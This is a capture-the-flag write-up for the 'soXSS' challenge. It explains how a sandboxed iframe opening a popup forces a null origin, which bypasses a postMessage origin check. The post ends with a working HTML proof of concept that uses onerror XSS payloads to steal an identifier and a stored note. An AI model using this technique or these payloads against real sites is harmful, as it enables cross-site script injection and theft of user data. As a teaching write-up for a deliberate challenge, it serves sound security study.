# soXSS - writeup

## Introduction

The [challenge](https://twitter.com/terjanq/status/1446500485142355972) consisted of two components:
1. Text input for HTML notes.
2. Rendered HTML page from textarea, rendered inside an iframe.

The embedded iframe was within the same origin, but data sent to it was sanitized by [DOMPurify](https://github.com/cure53/DOMPurify).

## The idea

The idea for the challenge was rather simple:
1. Bypass the below snippet included inside iframe.
```js
const identifier = '4a600cd2d4f9aa1cfb5aa786';
onmessage = e => {
  const data = e.data;
  if (e.origin !== window.origin && data.identifier !== identifier) return;
  if (data.type === 'render') {
    renderContainer.innerHTML = data.body;
  }
}
```
2. Steal the identifier.
3. Steal the saved note from the main page with a valid identifier.

*💡 The name of the challenge - soXSS - was referring to Same-Origin XSS.*

## The solution

One could [notice](https://so-xss.terjanq.me/index.php?source) that the identifier was stored in a user's session and the session cookie was set to Lax. To solve the challenge the intended way was to bypass the following check `e.origin !== window.origin`. When `//example.org` is embeded into a sandboxed iframe, then the page's origin will be `null`, i.e. `window.origin === 'null'`. So just by embedding the iframe via `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` we could force the `null` origin, only if the page was embeddable and cookies set to `SameSite=None`, but it wasn't the case for the challenge. The lesser known fact is that when the sandbox value `allow-popups` is set then the opened popup will inherit all the sandboxed attributes unless `allow-popups-to-escape-sandbox` is set. And that is the solution to the challenge: 
1. From a sandboxed page open a popup to `https://so-xss.terjanq.me/iframe.php`.
2. From any other `null` origin send a simple XSS to the popup and steal the identifier.
3. Open `https://so-xss.terjanq.me/iframe.php` and send XSS with stolen identifier so the origin is `so-xss.terjanq.me`.

All the steps are included in the below simple [PoC](https://so-xss-hof.terjanq.me/poc.html):

```html

<body>
  <script>
    f = document.createElement('iframe');
    f.sandbox = 'allow-scripts allow-popups allow-top-navigation';
    const payload = `x=opener.top;opener.postMessage(1,'*');setTimeout(()=>{
      x.postMessage({type:'render',identifier,body:'<img/src/onerror=alert(localStorage.html)>'},'*');
    },1000);`.replaceAll('\n',' ');
    f.srcdoc = `
    <h1>Click me!</h1>
    <script>
      onclick = e => {
        let w = open('https://so-xss.terjanq.me/iframe.php');
        onmessage = e => top.location = 'https://so-xss.terjanq.me/iframe.php';
        setTimeout(_ => {
          w.postMessage({type: "render", body: "<audio/src/onerror=\\"${payload}\\">"}, '*')
        }, 1000);
      };
    <\/script>
    `
    document.body.appendChild(f);
  </script>
</body>
```

## Credits
The challenge was created by [NDevTK](https://twitter.com/ndevtk) and [terjanq](https://twitter.com/terjanq).
